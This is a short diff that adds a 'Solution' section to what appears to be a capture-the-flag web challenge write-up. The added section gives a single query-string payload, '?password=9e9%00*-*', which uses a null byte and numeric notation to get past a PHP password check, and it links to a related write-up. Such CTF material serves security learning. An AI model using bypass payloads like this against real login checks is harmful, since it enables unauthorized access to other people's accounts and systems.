@@ -13,7 +13,11 @@ else{
 	echo '<p>Login first!</p>';
 ?>
 ```
-
+# Solution
+payload:
+```
+?password=9e9%00*-*
+```
 
 # Refference
 + [chybeta : FALSE](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#Once-More)
